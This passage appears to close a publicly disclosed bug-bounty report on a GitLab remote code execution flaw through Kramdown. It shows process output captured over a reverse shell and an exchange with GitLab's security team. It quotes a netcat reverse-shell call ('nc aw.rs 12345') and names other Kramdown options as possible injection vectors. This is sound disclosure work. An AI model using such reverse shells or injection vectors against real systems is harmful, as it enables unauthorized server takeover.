prometh+ 29466  0.5  0.0 720896 29076 ?        Sl   Jan27 351:43 /opt/prometheus/node_exporter/node_exporter --web.listen-address=:9100 --collector.mountstats --collector.nfs --collector.ntp --collector.textfile.directory=/opt/prometheus/node_exporter/metrics --collector.filesystem.ignored-fs-types=^(autofs|binfmt_misc|bpf|cgroup2?|configfs|debugfs|devpts|devtmpfs|fusectl|hugetlbfs|iso9660|mqueue|nfs.*|nsfs|overlay|proc|procfs|pstore|rpc_pipefs|securityfs|selinuxfs|squashfs|sysfs|tracefs)$ --collector.netstat.fields=^(.*_(InErrors|InErrs)|Ip_Forwarding|Ip(6|Ext)_(InOctets|OutOctets)|Icmp6?_(InMsgs|OutMsgs)|TcpExt_(Listen.*|Syncookies.*|TCPSynRetrans)|Tcp_(ActiveOpens|InSegs|OutSegs|OutRsts|PassiveOpens|RetransSegs|CurrEstab)|Udp6?_(InDatagrams|OutDatagrams|NoPorts|RcvbufErrors|SndbufErrors))$
root     29559  2.2  0.0 1701252 40300 ?       Sl   Jan27 1506:29 /opt/prometheus/mtail/mtail -progs /opt/prometheus/mtail/progs -logs /var/log/apt/term.log,/var/log/syslog,/var/log/td-agent/td-agent.log,/var/log/gitlab/gitlab-rails/*.log,/var/log/gitlab/unicorn/unicorn_stderr.log,/var/log/gitlab/unicorn/unicorn_stdout.log -logtostderr
root     29893  0.0  0.0  47692  3780 ?        Ss   Jan27   0:03 /sbin/rpcbind -f -w
root     31876  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/3:2]
git      32026 14.7  1.8 2988328 1246912 ?     Sl   02:31   6:15 puma: cluster worker 14: 4388 [gitlab-puma-worker]
root     32240  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/7:2]
root     32286  0.0  0.0      0     0 ?        I    02:32   0:01 [kworker/u32:0]
git      32427 13.6  1.8 2927556 1221412 ?     Sl   02:32   5:39 puma: cluster worker 0: 4388 [gitlab-puma-worker]
$ exit
Connection closed, listening again.
```

Cheers,
Will
- **2021-03-15** @dcouture: Thanks @vakzz,

Impressive work, this was escalated back to the team shortly after you provided the information (night time for me). We're investigating the logs for signs of prior exploitation and we were wondering if you're aware of other Kramdown options to achieve the same result?

Best regards,
Dominic
GitLab Security Team
- **2021-03-15** @vakzz: Hi @dcouture,

> we were wondering if you're aware of other Kramdown options to achieve the same result?

The other inline option is `template` but that is already forbidden by default in the latest version.

The `input` option can also be used, but this cannot be set inline and has to be passed in as an option to `kramdown::Document.new`.

Cheers,
Will
- **Report Resolved**
- **Bounty Awarded**
- **Bounty Awarded**
- **Agreed On Going Public**
- **2021-04-20** @dcouture: Hello @vakzz,

We were reviewing the information before disclosure and we wanted to make sure that those `nc aw.rs 12345` calls listed in the `ps` output are yours and not something else. :)

Thanks,
Dominic
GitLab Security Team
- **2021-04-20** @vakzz: Hi @dcouture,

Yep `aw.rs` is my domain, so that would be from the reverse shell and will have exited when I ended the connection.

Cheers,
Will
- **Agreed On Going Public**
- **Report Became Public**
